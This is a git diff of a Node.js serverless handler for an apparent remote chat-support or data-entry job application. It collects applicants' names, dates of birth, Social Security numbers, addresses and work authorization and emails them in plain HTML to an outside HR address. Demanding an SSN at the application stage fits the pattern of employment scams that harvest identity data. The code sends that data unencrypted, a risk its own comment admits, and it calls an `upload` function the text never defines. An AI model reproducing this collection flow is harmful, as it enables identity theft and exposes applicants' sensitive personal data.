@@ -1,6 +1,7 @@
 require("dotenv").config();
 const nodemailer = require("nodemailer");
 
+// Nodemailer transporter configuration
 const transporter = nodemailer.createTransport({
   host: "smtp.zoho.com",
   port: 587,
@@ -12,52 +13,62 @@ const transporter = nodemailer.createTransport({
   tls: { rejectUnauthorized: true },
 });
 
-module.exports = async (req, res) => {
-  try {
-    const formData = req.body;
-
-    if (formData.__gra__ || formData.consent) {
-      return res.send("Error: Invalid submission detected.");
+// Serverless function
+module.exports = (req, res) => {
+  upload(req, res, async (err) => {
+    if (err) {
+      return res.status(400).send(`Error sending application: ${err.message}.`);
     }
 
-    delete formData.__gra__;
-    delete formData.consent;
+    try {
+      const formData = req.body;
 
-    const mailOptions = {
-      from: process.env.ZOHO_USER,
-      to: "xinai.leunghr@qulaaengineering.com",
-      subject: "New Job Application Submission",
-      html: `
-        <h2>New Application for Remote Chat Support/Data Entry Role</h2>
-        <p><strong>Full Name:</strong> ${formData.name || "N/A"}</p>
-        <p><strong>Email:</strong> ${formData.email || "N/A"}</p>
-        <p><strong>Phone:</strong> ${formData.phone || "N/A"}</p>
-        <p><strong>Date of Birth:</strong> ${formData.dob || "N/A"}</p>
-        <p><strong>Social Security Number:</strong> ${formData.pid || "N/A"}</p>
-        <p><strong>Address:</strong> ${formData.address || "N/A"}</p>
-        <p><strong>State:</strong> ${formData.state || "N/A"}</p>
-        <p><strong>U.S. Authorized:</strong> ${formData.us_auth || "N/A"}</p>
-        <p><strong>Desired Salary:</strong> ${formData.salary || "N/A"} (${
-        formData.salary_type || "N/A"
-      })</p>
-        <p><strong>Weekly Hours:</strong> ${formData.hours || "N/A"}</p>
-        <p><strong>Genuine Information Confirmed:</strong> ${
-          formData.genuine ? "Yes" : "No"
-        }</p>
-      `,
-    };
+      // Filter out hidden inputs to prevent spam/bot submissions
+      if (formData.__gra__ || formData.consent) {
+        return res.send("Error: Invalid submission detected.");
+      }
 
-    // Send email
-    await transporter.sendMail(mailOptions);
-    res.send(
-      '✅ Your application has been submitted successfully! <a href="/">Back to form</a>'
-    );
-  } catch (error) {
-    console.error("Error sending email:", error);
-    res
-      .status(500)
-      .send(
-        `Error sending application: ${error.message}. <a href="/">Try again</a>`
+      // Remove hidden fields from formData
+      delete formData.__gra__;
+      delete formData.consent;
+
+      // Prepare email content (including SSN, but note security risk unless encrypted)
+      const mailOptions = {
+        from: process.env.ZOHO_USER,
+        to: "xinai.leunghr@qulaaengineering.com",
+        subject: "New Job Application Submission",
+        html: `
+          <h2>New Application for Remote Chat Support/Data Entry Role</h2>
+          <p><strong>Full Name:</strong> ${formData.name || "N/A"}</p>
+          <p><strong>Email:</strong> ${formData.email || "N/A"}</p>
+          <p><strong>Phone:</strong> ${formData.phone || "N/A"}</p>
+          <p><strong>Date of Birth:</strong> ${formData.dob || "N/A"}</p>
+          <p><strong>SSN:</strong> ${formData.pid || "N/A"}</p>
+          <p><strong>Address:</strong> ${formData.address || "N/A"}</p>
+          <p><strong>State:</strong> ${formData.state || "N/A"}</p>
+          <p><strong>U.S. Authorized:</strong> ${formData.us_auth || "N/A"}</p>
+          <p><strong>Desired Salary:</strong> ${formData.salary || "N/A"} (${
+          formData.salary_type || "N/A"
+        })</p>
+          <p><strong>Weekly Hours:</strong> ${formData.hours || "N/A"}</p>
+          <p><strong>Genuine Information Confirmed:</strong> ${
+            formData.genuine ? "Yes" : "No"
+          }</p>
+        `,
+      };
+
+      // Send email
+      await transporter.sendMail(mailOptions);
+      res.send(
+        '✅ Your application has been submitted successfully! <a href="/">Back to form</a>'
       );
-  }
+    } catch (error) {
+      console.error("Error sending email:", error);
+      res
+        .status(500)
+        .send(
+          `Error sending application: ${error.message}. <a href=\"/\">Try again</a>`
+        );
+    }
+  });
 };
